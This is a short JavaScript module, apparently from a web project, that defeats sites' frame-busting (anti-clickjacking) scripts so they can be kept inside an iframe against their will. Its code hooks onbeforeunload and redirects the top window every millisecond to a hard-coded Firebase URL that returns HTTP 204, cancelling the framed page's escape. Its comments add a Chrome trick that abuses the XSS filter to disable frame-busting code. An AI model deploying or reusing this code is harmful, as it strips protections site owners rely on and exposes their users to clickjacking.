// frame-buster-busting by overriding url change with url that responds with 204 status.

// free services you can get a 204 response from: 
// - firebase (REST api url with ?print=silent)
// - tonicdev (make an endpoint that responds with 204)

// another method for framebustbusting (chrome only):  
// add the script text (including <script> tag) as url parameter to the iframe src,
// e.g.:  "http://www.framebustingurl.com?v=" + encodeURIComponent("<script>frame_busting_code_here</script>")
// see pg. 4 here: https://crypto.stanford.edu/~dabo/pubs/papers/framebust.pdf


var url = 'https://streamz.firebaseio.com/admin.json?print=silent'; // returns 204 response
// alternative: https://tonicdev.io/56d84eb58757b50d00444425/5720f7f6e6b66912004458e1/branches/master


var timer;

// TODO: clear timer a few seconds after framebusting iframe has loaded

module.exports = function(clear) {

	if (timer) {
		clearInterval(timer);
		timer = 0;
	}

	if (clear) {
		return;
	}

	var prevent_bust = 0;

	window.onbeforeunload = function() { prevent_bust++ }

	timer = setInterval(function() {
		if (prevent_bust > 0) {
			prevent_bust -= 2
			window.top.location = url;
		}
	}, 1);

}